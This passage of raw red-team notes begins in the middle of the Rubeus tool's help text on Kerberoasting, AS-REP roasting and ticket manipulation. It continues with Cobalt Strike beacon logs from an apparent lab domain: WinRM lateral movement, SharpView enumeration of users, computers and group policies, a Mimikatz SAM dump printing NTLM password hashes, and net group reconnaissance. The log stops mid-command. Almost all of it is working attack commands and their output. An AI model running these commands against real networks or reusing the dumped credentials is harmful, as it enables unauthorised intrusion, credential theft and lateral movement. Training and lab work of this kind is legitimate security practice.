        Rubeus.exe kerberoast /simple [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/nowrap]



    Perform Kerberoasting with alternate credentials:

        Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/nowrap]



    Perform Kerberoasting with an existing TGT:

        Rubeus.exe kerberoast /spn:"blah/blah" </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]



    Perform Kerberoasting using the tgtdeleg ticket to request service tickets - requests RC4 for AES accounts:

        Rubeus.exe kerberoast /usetgtdeleg [/nowrap]



    Perform "opsec" Kerberoasting, using tgtdeleg, and filtering out AES-enabled accounts:

        Rubeus.exe kerberoast /rc4opsec [/nowrap]



    List statistics about found Kerberoastable accounts without actually sending ticket requests:

        Rubeus.exe kerberoast /stats [/nowrap]



    Perform Kerberoasting, requesting tickets only for accounts with an admin count of 1 (custom LDAP filter):

        Rubeus.exe kerberoast /ldapfilter:'admincount=1' [/nowrap]



    Perform Kerberoasting, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 5 service tickets:

        Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5 [/nowrap]

        

    Perform AES Kerberoasting:

        Rubeus.exe kerberoast /aes [/nowrap]



    Perform AS-REP "roasting" for any users without preauth:

        Rubeus.exe asreproast [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/nowrap]



    Perform AS-REP "roasting" for any users without preauth, outputting Hashcat format to a file:

        Rubeus.exe asreproast /outfile:hashes.txt /format:hashcat [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."]



    Perform AS-REP "roasting" for any users without preauth using alternate credentials:

        Rubeus.exe asreproast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU,..."] [/nowrap]





 Miscellaneous:



    Create a hidden program (unless /show is passed) with random /netonly credentials, displaying the PID and LUID:

        Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" [/show]



    Reset a user's password from a supplied TGT (AoratoPw):

        Rubeus.exe changepw </ticket:BASE64 | /ticket:FILE.KIRBI> /new:PASSWORD [/dc:DOMAIN_CONTROLLER]



    Calculate rc4_hmac, aes128_cts_hmac_sha1, aes256_cts_hmac_sha1, and des_cbc_md5 hashes:

        Rubeus.exe hash /password:X [/user:USER] [/domain:DOMAIN]



    Substitute an sname or SPN into an existing service ticket:

        Rubeus.exe tgssub </ticket:BASE64 | /ticket:FILE.KIRBI> /altservice:ldap [/ptt] [/luid] [/nowrap]

        Rubeus.exe tgssub </ticket:BASE64 | /ticket:FILE.KIRBI> /altservice:cifs/computer.domain.com [/ptt] [/luid] [/nowrap]

    

    Display the current user's LUID:

        Rubeus.exe currentluid



    The "/consoleoutfile:C:\FILE.txt" argument redirects all console output to the file specified.



    The "/nowrap" flag prevents any base64 ticket blobs from being column wrapped for any function.





 NOTE: Base64 ticket blobs can be decoded with :



    [IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("aa..."))

```

```
jump winrm64 web.dev.cyberbotic.io smb
ame: WSADM domain: CORP)
jump winrm64 wsadm.corp
```

beacon> execute-assembly /usr/share/poshc2/resources/modules/Seatbelt.exe OSInfo -ComputerName=web


Going to try Sharpview.exe, amsi only detects powershell

execute-assembly /root/tooltesting/SharpView.exe
Sharpview works
#sharpview
```shell
[10/06 15:59:58] beacon> execute-assembly /root/tooltesting/SharpView.exe Get-NetDomain
[10/06 16:01:13] [*] Tasked beacon to run .NET program: SharpView.exe Get-NetDomain
[10/06 16:01:14] [+] host called home, sent: 843845 bytes
[10/06 16:01:17] [+] received output:
Forest                         : corp.local


[10/06 16:01:19] [+] received output:
DomainControllers              : {DC01.corp.local}

Children                       : {}

DomainMode                     : Unknown

DomainModeLevel                : 7

PdcRoleOwner                   : DC01.corp.local

RidRoleOwner                   : DC01.corp.local

InfrastructureRoleOwner        : DC01.corp.local

Name                           : corp.local

```

```shell
[10/06 16:05:01] beacon> execute-assembly /root/tooltesting/SharpView.exe Get-DomainUser -Properties name, MemberOf | fl
[10/06 16:06:12] [*] Tasked beacon to run .NET program: SharpView.exe Get-DomainUser -Properties name, MemberOf | fl
[10/06 16:06:14] [+] host called home, sent: 843911 bytes
[10/06 16:06:17] [+] received output:
get-domain


[10/06 16:06:23] [+] received output:
[Get-DomainSearcher] search base: LDAP://DC01.corp.local/DC=corp,DC=local

[Get-DomainUser] filter string: (&(samAccountType=805306368))

name                           : Administrator



name                           : Guest



name                           : DefaultAccount



name                           : krbtgt



name                           : bob



name                           : joe



name                           : bill



name                           : salvador



name                           : lazy_admin



name                           : vincent.delpy



name                           : iamtheadministrator



name                           : justalocaladmin



name                           : Gracie Stephenson



name                           : Alicia Mountgarrett



name                           : Julian Hann



name                           : Linda Bellantoni



name                           : Lincoln Gresham



name                           : Ellie Reynolds



name                           : Mary Torres



name                           : Oscar Collier



name                           : Kiera Steele



name                           : Luca Macghey



name                           : Fernando Figueroa



name                           : Russell Ford



name                           : Lee Potter



name                           : Suzanne Young



name                           : Brandy Moore



name                           : Zac Wootten



name                           : Samuel Bradshaw



name                           : Denise Davis



name                           : Eva Moulds



name                           : Alex Jackson



name                           : Matilda Whiddon



name                           : Audrey Kidd



name                           : Grant Kelly



name                           : Andrew Buchanan



name                           : Sienna Hancock



name                           : Libby Graham



name                           : Noah Wong



name                           : Kyle Holmes



name                           : Ebony Penman



name                           : Steven Cardiel



name                           : Michael Leach



name                           : Scarlett Connell



name                           : Micheal Arnold



name                           : Jade Hancock



name                           : Laurie Norris



name                           : Keira Daniels



name                           : Laura Owens



name                           : Henry Booth



name                           : Chad Pearson



name                           : Amelie Baxter



name                           : Bethany Marshall



name                           : Gabrielle Caley



name                           : Josh Byrne



name                           : Riley Keighley



name                           : Henry Howard



name                           : Tilly Rowley



name                           : George Lamb



name                           : Blake Harricks



name                           : Robert Oh



name                           : Katie Pollard



name                           : Patrick Carter



name                           : Cecilia Ogden



name                           : Mackenzie Carrodus



name                           : Morgan Lawson



name                           : William Lawson



name                           : Logan Herbert



name                           : Jayden Beor



name                           : Jim Jones



name                           : Alexandra Bowen



name                           : Molly McCarthy



name                           : Viola Buffington



name                           : Sandy Lin



name                           : Evan Smart



name                           : Finley Savage



name                           : Raymond Scott



name                           : Jacob Law



name                           : Lara Singh



name                           : Celia Hammon



name                           : Ellis Fry



name                           : Elise Warren



name                           : Alicia Gould



name                           : Wilson Neal



name                           : Madison Knatchbull



name                           : Anna Hamilton



name                           : Ruby Selleck



name                           : Stella To Rot



name                           : Cooper Cumming



name                           : Francesca Middleton



name                           : Kayleigh Mellor



name                           : Imogen John



name                           : David Thompson



name                           : Lucas Koerstz



name                           : Keira Reed



name                           : Heather Benevides



name                           : Mark Brady



name                           : Kian Pearce



name                           : Evan Gill



name                           : Lucas Marshall



name                           : Mohammed Cartwright



name                           : Brett Sampson



name                           : Ava Pike



name                           : Flynn Saville-Kent



name                           : Kian Powell



name                           : Alexis Kohler



name                           : Karen Martin



name                           : Maisie Holmes



name                           : Lucy Russell



name                           : Matilda Packard



name                           : Dorthy Patterson



name                           : Isobel Barry



name                           : Jodie Swift



name                           : Gabrielle Mitchell



name                           : Alfred Bailey



name                           : Melvin Walker



name                           : Amy Jones



name                           : Lorene Simon



name                           : Emma Bailey



name                           : Ella Cunningham



name                           : Sam Holden



name                           : Linda Moreland



name                           : James Bennett



name                           : Jude Wade



name                           : William Winston



name                           : Lilly Westgarth



name                           : Freya Mills



name                           : Cindy Orman



name                           : Lenny Harper



name                           : Taylah Kirkpatrick



name                           : Archer De La Rue



name                           : Linda Patterson



name                           : Jim Staton



name                           : Maya Parsons



name                           : Lydia Knowles



name                           : Stephanie Ackermann



name                           : Eva Haynes



name                           : Anthony Shuman



name                           : Rachel Chapman



name                           : Amber Dinah



name                           : James Jenkins



name                           : Jack Goodwin



name                           : Jean King



name                           : Ella Brigden



name                           : Samantha Broger



name                           : Riley Hussain



name                           : Timothy Lowry



name                           : Samantha Milliner



name                           : Lola Gibbons



name                           : Niamh Myers



name                           : Madeline Campion



name                           : Lloyd Bracco



name                           : Lucas Toomey



name                           : Anita Harmon



name                           : Aiden Traeger



name                           : Luca Newton



name                           : Aaron Carr



name                           : Debbie Crawley



name                           : Michael Conti



name                           : Martin Whitehead



name                           : Shirley Arellano



name                           : Merle Moore



name                           : Lucy Levey



name                           : Keira Bentley



name                           : Anna Germany



name                           : Chelsea Finch



name                           : Delphine Russell



name                           : Benjamin Jones



name                           : Dorothy Warren



name                           : Aiden Trickett



name                           : Jay Barlow



name                           : Kay Wallace



name                           : Mitchell Reynolds



name                           : Maya Ormond



name                           : James Day



name                           : Mohammad Daly



name                           : Cedric Hernandez



name                           : Lucy Broger



name                           : Bianca Speckman



name                           : David Silva



name                           : Rose Gregg



name                           : Ruby Fisken



name                           : Craig Waldrop



name                           : Jaxon Trumble



name                           : Gracie Coates



name                           : Ada Bell



name                           : Harvey Bailey



name                           : Esther Barrett



name                           : Cameron Macansh



name                           : Sharon Main



name                           : Courtney Hein



name                           : Emily Sullivan



name                           : Owen Miah



name                           : Jack Dobie



name                           : Isaac Chamberlain



name                           : Ellie Doherty



name                           : Finlay Rowley



name                           : Jade Adams



name                           : Andrew Eaton



name                           : William North



name                           : David Sims



name                           : Isabelle Coane



name                           : Callum Parker



name                           : Hayden Newman



name                           : Mary Rucker



name                           : Olivia Ramsay



name                           : Chelsea Boyle



name                           : Rachel Cross



name                           : Dylan Crawford



name                           : Renee Wallace



name                           : cyber_adm



name                           : cyberops_svc



name                           : svc_testldap



name                           : svc_splunk



name                           : svc_mssql



name                           : svc_commvaultdb



name                           : svc_sccm



name                           : svc_iis



name                           : wsadmin



name                           : ned_adm



name                           : ned.flanders_adm



name                           : svc_devops



name                           : pgibbons



name                           : svc_opmanager

```
Get-DomainComputers
```shell
[10/06 16:15:41] beacon> execute-assembly /root/tooltesting/SharpView.exe Get-DomainComputer -Properties DnsHostName
[10/06 16:16:27] [*] Tasked beacon to run .NET program: SharpView.exe Get-DomainComputer -Properties DnsHostName
[10/06 16:16:29] [+] host called home, sent: 843903 bytes
[10/06 16:16:31] [+] received output:
get-domain

[Get-DomainSearcher] search base: LDAP://DC01.corp.local/DC=corp,DC=local

[Get-DomainComputer] Get-DomainComputer filter string: (&(samAccountType=805306369))


[10/06 16:16:36] [+] received output:
dnshostname                    : DC01.corp.local



dnshostname                    : SQL01.corp.local



dnshostname                    : FS01.corp.local



dnshostname                    : WS02.corp.local



dnshostname                    : MS01.corp.local



dnshostname                    : WSADM.corp.local



dnshostname                    : WEB-WIN01.corp.local

```
Get-GroupPolicy
```shell
[10/06 16:17:52] beacon> execute-assembly /root/tooltesting/SharpView.exe Get-DomainGPO | select displayName
[10/06 16:18:38] [*] Tasked beacon to run .NET program: SharpView.exe Get-DomainGPO | select displayName
[10/06 16:18:39] [+] host called home, sent: 843887 bytes
[10/06 16:18:41] [+] received output:
get-domain

[Get-DomainSearcher] search base: LDAP://DC01.corp.local/DC=corp,DC=local

[Get-DomainGPO] filter string: (&(objectCategory=groupPolicyContainer))


[10/06 16:18:47] [+] received output:
objectguid                     : b27fd1e1-b64e-4d05-9920-82a03dec5c83

name                           : {31B2F340-016D-11D2-945F-00C04FB984F9}

distinguishedname              : CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=corp,DC=local

whencreated                    : 3/28/2018 12:37:01 AM

whenchanged                    : 1/31/2020 3:08:15 PM

cn                             : {{31B2F340-016D-11D2-945F-00C04FB984F9}}

objectclass                    : {top, container, groupPolicyContainer}

displayname                    : Default Domain Policy

gpcfunctionalityversion        : 2

usnchanged                     : 241750

showinadvancedviewonly         : True

gpcmachineextensionnames       : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{B1BE8D72-6EAC-11D2-A4EA-00C04F79F83A}{53D6AB1B-2488-11D1-A28C-00C04FB94F17}][{D76B9641-3288-4F75-942D-087DE603E3EA}{D02B1F72-3407-48AE-BA88-E8213C6761F1}]

instancetype                   : 4

versionnumber                  : 44

gpcfilesyspath                 : \\corp.local\sysvol\corp.local\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}

usncreated                     : 5900

flags                          : 0

objectcategory                 : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=corp,DC=local

iscriticalsystemobject         : True

systemflags                    : -1946157056

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 12:00:00 AM}



objectguid                     : 3a0291cc-8bc0-46c5-b37f-7161506ae176

name                           : {6AC1786C-016F-11D2-945F-00C04fB984F9}

distinguishedname              : CN={6AC1786C-016F-11D2-945F-00C04fB984F9},CN=Policies,CN=System,DC=corp,DC=local

whencreated                    : 3/28/2018 12:37:01 AM

whenchanged                    : 1/31/2020 2:52:40 PM

cn                             : {{6AC1786C-016F-11D2-945F-00C04fB984F9}}

objectclass                    : {top, container, groupPolicyContainer}

displayname                    : Default Domain Controllers Policy

gpcfunctionalityversion        : 2

usnchanged                     : 238464

showinadvancedviewonly         : True

gpcmachineextensionnames       : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}][{D76B9641-3288-4F75-942D-087DE603E3EA}{D02B1F72-3407-48AE-BA88-E8213C6761F1}]

instancetype                   : 4

versionnumber                  : 17

gpcfilesyspath                 : \\corp.local\sysvol\corp.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}

usncreated                     : 5903

flags                          : 0

objectcategory                 : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=corp,DC=local

iscriticalsystemobject         : True

systemflags                    : -1946157056

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 3/29/2018 5:12:12 AM, 3/28/2018 12:38:48 AM, 1/1/1601 12:00:00 AM}



objectguid                     : b8e4100f-b20a-463e-ba14-f9e4eb81a3db

name                           : {44506300-4B1F-41BC-9544-DED4BF11A6C0}

distinguishedname              : CN={44506300-4B1F-41BC-9544-DED4BF11A6C0},CN=Policies,CN=System,DC=corp,DC=local

whencreated                    : 4/24/2018 1:02:23 AM

whenchanged                    : 4/25/2018 6:06:28 PM

cn                             : {{44506300-4B1F-41BC-9544-DED4BF11A6C0}}

objectclass                    : {top, container, groupPolicyContainer}

displayname                    : LAPS

gpcfunctionalityversion        : 2

usnchanged                     : 45119

showinadvancedviewonly         : True

gpcmachineextensionnames       : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{C6DC5466-785A-11D2-84D0-00C04FB169F7}{942A8E4F-A261-11D1-A760-00C04FB9603F}][{D76B9641-3288-4F75-942D-087DE603E3EA}{D02B1F72-3407-48AE-BA88-E8213C6761F1}]

instancetype                   : 4

versionnumber                  : 65543

usncreated                     : 37694

flags                          : 0

objectcategory                 : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=corp,DC=local

gpcfilesyspath                 : \\corp.local\sysvol\corp.local\Policies\{44506300-4B1F-41BC-9544-DED4BF11A6C0}

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 1/1/1601 12:00:00 AM}



objectguid                     : 9b4d8c33-04cf-4909-afc5-ccc10a37ab83

name                           : {6A8E6303-37FC-4685-AAAF-13EF6D78AB0E}

distinguishedname              : CN={6A8E6303-37FC-4685-AAAF-13EF6D78AB0E},CN=Policies,CN=System,DC=corp,DC=local

whencreated                    : 4/25/2018 5:08:45 PM

whenchanged                    : 4/25/2018 5:09:39 PM

cn                             : {{6A8E6303-37FC-4685-AAAF-13EF6D78AB0E}}

objectclass                    : {top, container, groupPolicyContainer}

displayname                    : Disable machine account password change

gpcfunctionalityversion        : 2

usnchanged                     : 44538

showinadvancedviewonly         : True

gpcmachineextensionnames       : [{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]

instancetype                   : 4

versionnumber                  : 4

usncreated                     : 44527

flags                          : 0

objectcategory                 : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=corp,DC=local

gpcfilesyspath                 : \\corp.local\SysVol\corp.local\Policies\{6A8E6303-37FC-4685-AAAF-13EF6D78AB0E}

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 1/1/1601 12:00:00 AM}



objectguid                     : 550d7114-2b2f-4e99-af84-1a66d3e3d705

name                           : {73CF7CDB-C616-45C4-B766-D4A3B39ACB80}

distinguishedname              : CN={73CF7CDB-C616-45C4-B766-D4A3B39ACB80},CN=Policies,CN=System,DC=corp,DC=local

whencreated                    : 4/25/2018 5:36:02 PM

whenchanged                    : 9/7/2018 8:55:02 PM

cn                             : {{73CF7CDB-C616-45C4-B766-D4A3B39ACB80}}

objectclass                    : {top, container, groupPolicyContainer}

displayname                    : Enable WinRM

gpcfunctionalityversion        : 2

usnchanged                     : 200790

showinadvancedviewonly         : True

gpcmachineextensionnames       : [{00000000-0000-0000-0000-000000000000}{CC5746A9-9B74-4BE5-AE2E-64379C86E0E4}][{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}][{91FBB303-0CD5-4055-BF42-E512A681B325}{CC5746A9-9B74-4BE5-AE2E-64379C86E0E4}]

instancetype                   : 4

versionnumber                  : 9

usncreated                     : 44591

flags                          : 0

objectcategory                 : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=corp,DC=local

gpcfilesyspath                 : \\corp.local\SysVol\corp.local\Policies\{73CF7CDB-C616-45C4-B766-D4A3B39ACB80}

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 1/1/1601 12:00:00 AM}



objectguid                     : 7c14d28d-c45e-44dd-829e-85c805706c92

name                           : {50DAC4AE-8511-4F54-B36B-11C611AA5365}

distinguishedname              : CN={50DAC4AE-8511-4F54-B36B-11C611AA5365},CN=Policies,CN=System,DC=corp,DC=local

whencreated                    : 5/1/2018 8:01:35 PM

whenchanged                    : 5/1/2018 8:01:35 PM

cn                             : {{50DAC4AE-8511-4F54-B36B-11C611AA5365}}

objectclass                    : {top, container, groupPolicyContainer}

displayname                    : Restrict EA change pw

gpcfunctionalityversion        : 2

usnchanged                     : 77756

showinadvancedviewonly         : True

instancetype                   : 4

versionnumber                  : 0

usncreated                     : 77751

flags                          : 0

objectcategory                 : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=corp,DC=local

gpcfilesyspath                 : \\corp.local\SysVol\corp.local\Policies\{50DAC4AE-8511-4F54-B36B-11C611AA5365}

dscorepropagationdata          : {6/11/2018 3:20:34 AM, 1/1/1601 12:00:00 AM}



objectguid                     : c08532a3-2465-401c-9cc6-fd626aaad71c

name                           : {CFA18487-7F4B-4CF3-B0F9-CCBE6EFE6D49}

distinguishedname              : CN={CFA18487-7F4B-4CF3-B0F9-CCBE6EFE6D49},CN=Policies,CN=System,DC=corp,DC=local

whencreated                    : 7/16/2018 9:51:30 PM

whenchanged                    : 2/27/2020 4:10:47 AM

cn                             : {{CFA18487-7F4B-4CF3-B0F9-CCBE6EFE6D49}}

objectclass                    : {top, container, groupPolicyContainer}

displayname                    : Debug privs

gpcfunctionalityversion        : 2

usnchanged                     : 270440

showinadvancedviewonly         : True

gpcmachineextensionnames       : [{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]

instancetype                   : 4

versionnumber                  : 4

usncreated                     : 172409

flags                          : 0

objectcategory                 : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=corp,DC=local

gpcfilesyspath                 : \\corp.local\SysVol\corp.local\Policies\{CFA18487-7F4B-4CF3-B0F9-CCBE6EFE6D49}

dscorepropagationdata          : 1/1/1601 12:00:00 AM



objectguid                     : 7902e848-8fe4-448a-8624-03c40cb03843

name                           : {E5D6EB27-FEA3-4AD1-A236-CB4BF76BC0E9}

distinguishedname              : CN={E5D6EB27-FEA3-4AD1-A236-CB4BF76BC0E9},CN=Policies,CN=System,DC=corp,DC=local

whencreated                    : 9/4/2018 6:18:35 PM

whenchanged                    : 9/4/2018 6:19:54 PM

cn                             : {{E5D6EB27-FEA3-4AD1-A236-CB4BF76BC0E9}}

objectclass                    : {top, container, groupPolicyContainer}

displayname                    : Disable local admin account

gpcfunctionalityversion        : 2

usnchanged                     : 192645

showinadvancedviewonly         : True

gpcmachineextensionnames       : [{827D319E-6EAC-11D2-A4EA-00C04F79F83A}{803E14A0-B4FB-11D0-A0D0-00A0C90F574B}]

instancetype                   : 4

versionnumber                  : 4

usncreated                     : 192635

flags                          : 0

objectcategory                 : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=corp,DC=local

gpcfilesyspath                 : \\corp.local\SysVol\corp.local\Policies\{E5D6EB27-FEA3-4AD1-A236-CB4BF76BC0E9}

dscorepropagationdata          : 1/1/1601 12:00:00 AM



objectguid                     : 633584a3-e470-4552-a36a-1b38b65ffb54

name                           : {D598C83F-9E9F-44B6-AFF7-4FB7A037AE54}

distinguishedname              : CN={D598C83F-9E9F-44B6-AFF7-4FB7A037AE54},CN=Policies,CN=System,DC=corp,DC=local

whencreated                    : 10/30/2018 8:48:51 PM

whenchanged                    : 10/30/2018 9:03:36 PM

cn                             : {{D598C83F-9E9F-44B6-AFF7-4FB7A037AE54}}

objectclass                    : {top, container, groupPolicyContainer}

displayname                    : IPPSEC WAS HERE

gpcfunctionalityversion        : 2

usnchanged                     : 209123

showinadvancedviewonly         : True

gpcmachineextensionnames       : [{00000000-0000-0000-0000-000000000000}{BEE07A6A-EC9F-4659-B8C9-0B1937907C83}][{B087BE9D-ED37-454F-AF9C-04291E351182}{BEE07A6A-EC9F-4659-B8C9-0B1937907C83}]

instancetype                   : 4

versionnumber                  : 10

usncreated                     : 209082

flags                          : 0

objectcategory                 : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=corp,DC=local

gpcfilesyspath                 : \\corp.local\SysVol\corp.local\Policies\{D598C83F-9E9F-44B6-AFF7-4FB7A037AE54}

dscorepropagationdata          : 1/1/1601 12:00:00 AM



objectguid                     : 7ddc8b07-a924-4033-b715-1f219c1203a8

name                           : {8D1FAFE4-01D8-491E-B6B0-49C6793B40FE}

distinguishedname              : CN={8D1FAFE4-01D8-491E-B6B0-49C6793B40FE},CN=Policies,CN=System,DC=corp,DC=local

whencreated                    : 1/31/2020 3:10:12 PM

whenchanged                    : 1/31/2020 3:12:32 PM

cn                             : {{8D1FAFE4-01D8-491E-B6B0-49C6793B40FE}}

objectclass                    : {top, container, groupPolicyContainer}

displayname                    : Enable Defender

gpcfunctionalityversion        : 2

usnchanged                     : 241767

showinadvancedviewonly         : True

gpcmachineextensionnames       : [{35378EAC-683F-11D2-A89A-00C04FBBCFA2}{D02B1F72-3407-48AE-BA88-E8213C6761F1}]

instancetype                   : 4

versionnumber                  : 2

usncreated                     : 241754

flags                          : 0

objectcategory                 : CN=Group-Policy-Container,CN=Schema,CN=Configuration,DC=corp,DC=local

gpcfilesyspath                 : \\corp.local\SysVol\corp.local\Policies\{8D1FAFE4-01D8-491E-B6B0-49C6793B40FE}

dscorepropagationdata          : 1/1/1601 12:00:00 AM

```

```
[10/06 16:27:26] beacon> mimikatz !lsadump::sam
[10/06 16:27:53] [*] Tasked beacon to run mimikatz's !lsadump::sam command
[10/06 16:27:57] [+] host called home, sent: 813679 bytes
[10/06 16:27:59] [+] received output:
Domain : MS01
SysKey : a72365a2384f0ff6ad435c166a5bbebc
Local SID : S-1-5-21-4116505479-897374152-2296881962

SAMKey : 8e8ec73c9103331c928f72c2e48d31be

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 7facdc498ed1680c4fd1448319a8c04f

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000003e9 (1001)
User : justalocaladmin
  Hash NTLM: 9ec2c1f739466d0d9e1bd7d792bda6fb
    lm  - 0: 1d2e5e158fe38e31e7a9e6354fd68ebc
    lm  - 1: 662b5eb931c629a1959f21ab24fb5518
    lm  - 2: 278edb6bcaa746e8bb7bf0f05cc9d19c
    lm  - 3: 879a875314098e1b2ebb6b1b5c9a2b1a
    lm  - 4: b7ba9afd3fb1cdf34bf65734ddb4a739
    lm  - 5: 7d3080aedf1c80462dd46c0218328ae8
    lm  - 6: a8d2c3f1f971eccefd218c0c695f35ce
    lm  - 7: 3e6d398b1c03c9533b978bb7312a3062
    lm  - 8: cee1fa1fc21054f025ab28a763841ab5
    lm  - 9: 4ce82b506e7799228e4957b104b3c227
    lm  -10: 683a6c1e87f931aa3881b3a7cdebf03f
    lm  -11: cf966e3b896ed678844fd5e723edfd4f
    lm  -12: fd5495d48410ba21025a5849cb99c1b0
    lm  -13: 69b26b55b8b4d0081a17085343da3d93
    lm  -14: 5cdb89625815d9781886ed84bb438e2c
    lm  -15: 111330f7d9cd2a5b663dd224304e7aeb
    lm  -16: 856fb0e2a0cde2a13db333e9cc50f1c4
    lm  -17: f2d03d6e88ef4879e1ba939b6227e06a
    lm  -18: d0192852e35b2de2101926cea45e0400
    lm  -19: 9488607a098b11f1c808f6876518ec8f
    lm  -20: cb659066a4f7a2f7c979fab9ed978dae
    lm  -21: f4a93494e41cd4afe3e9c5e7ecb73635
    lm  -22: c31d64e8335a7824973703235676f29d
    lm  -23: c6292e753e3e1dd5ffc338fde854674d
    ntlm- 0: 9ec2c1f739466d0d9e1bd7d792bda6fb
    ntlm- 1: 65c125df955595ab339ce3daf7b6134a
    ntlm- 2: 3eb47a38d9915ed44d92e813f73c1a3c
    ntlm- 3: b6eaa6ad675da196ea6edcc80245ef70
    ntlm- 4: a0d3dd384aa4dd28b20a688b237f9008
    ntlm- 5: c9b0ae650afa35fe4e23b952285d1c3f
    ntlm- 6: 1f9b75aa1b748c39b31c4b745c95c071
    ntlm- 7: 9c01a2b05ed82b4532c76efc141c9b7d
    ntlm- 8: 7a68577fa40ab31a1dd9cc3ffdb7e714
    ntlm- 9: 0b61202610be5950653013de65bf2a97
    ntlm-10: bf965175fad8c9a7745c30c535b1a0e5
    ntlm-11: 7d58711c1ffdd7c254be28f0fbde8f8b
    ntlm-12: dbf3ea014a783aeeab1a2b97c42ab020
    ntlm-13: 9b55ef44eb1ec0de4dc3e70b138af39c
    ntlm-14: a2b65fbf9a3db4dd06aad7d826baad13
    ntlm-15: f44e0e9f39e78f6ec020946b8d1b7025
    ntlm-16: fad1d40335ea9eebc6c0da605703d833
    ntlm-17: 33ffb145017a50c09e3237cd9fe6e053
    ntlm-18: 068069020be652f3906e4c87fe0b3eb3
    ntlm-19: a9d41ad8fa30aa9b5eeaed5f0970a6bf
    ntlm-20: 061e8aef3659fd23f89ab5dc3c55afef
    ntlm-21: a982d7bec9ac2aa96f5a23829c14e0f4
    ntlm-22: 2cd4623614bb98fcbb6a3464c88c5252
    ntlm-23: 362e2a464084bbeb95d10d85e470c30e
```

```
[10/06 16:33:31] beacon> shell netgroup administrator
[10/06 16:33:31] [*] Tasked beacon to run: netgroup administrator
[10/06 16:33:32] [+] host called home, sent: 53 bytes
[10/06 16:33:32] [+] received output:
'netgroup' is not recognized as an internal or external command,

operable program or batch file.


[10/06 16:33:41] beacon> shell net user administrator
[10/06 16:33:41] [*] Tasked beacon to run: net user administrator
[10/06 16:33:42] [+] host called home, sent: 53 bytes
[10/06 16:33:42] [+] received output:
User name                    Administrator

Full Name                    

Comment                      Built-in account for administering the computer/domain

User's comment               

Country/region code          000 (System Default)

Account active               No

Account expires              Never



Password last set            3/28/2018 3:51:52 PM

Password expires             Never

Password changeable          3/29/2018 3:51:52 PM

Password required            Yes

User may change password     Yes



Workstations allowed         All

Logon script                 

User profile                 

Home directory               

Last logon                   4/20/2018 7:09:36 AM



Logon hours allowed          All



Local Group Memberships      *Administrators       

Global Group memberships     *None                 

The command completed successfully.




[10/06 16:34:04] beacon> shell net group administrator
[10/06 16:34:04] [*] Tasked beacon to run: net group administrator
[10/06 16:34:08] [+] host called home, sent: 54 bytes
[10/06 16:34:08] [+] received output:
This command can be used only on a Windows Domain Controller.



More help is available by typing NET HELPMSG 3515.




[10/06 16:35:09] beacon> shell net localgroup
[10/06 16:35:09] [*] Tasked beacon to run: net localgroup
[10/06 16:35:10] [+] host called home, sent: 45 bytes
[10/06 16:35:10] [+] received output:


Aliases for \\MS01



-------------------------------------------------------------------------------

*Access Control Assistance Operators

*Administrators

*Backup Operators

*Certificate Service DCOM Access

*Cryptographic Operators

*Distributed COM Users

*Event Log Readers

*Guests

*Hyper-V Administrators

*IIS_IUSRS

*Network Configuration Operators

*Performance Log Users

*Performance Monitor Users

*Power Users

*Print Operators

*RDS Endpoint Servers

*RDS Management Servers

*RDS Remote Access Servers

*Remote Desktop Users

*Remote Management Users

*Replicator

*Storage Replica Administrators

*System Managed Accounts Group

*Users

The command completed successfully.




[10/06 16:35:27] beacon> shell net localgroup Remote Desktop Users
[10/06 16:35:27] [*] Tasked beacon to run: net localgroup Remote Desktop Users
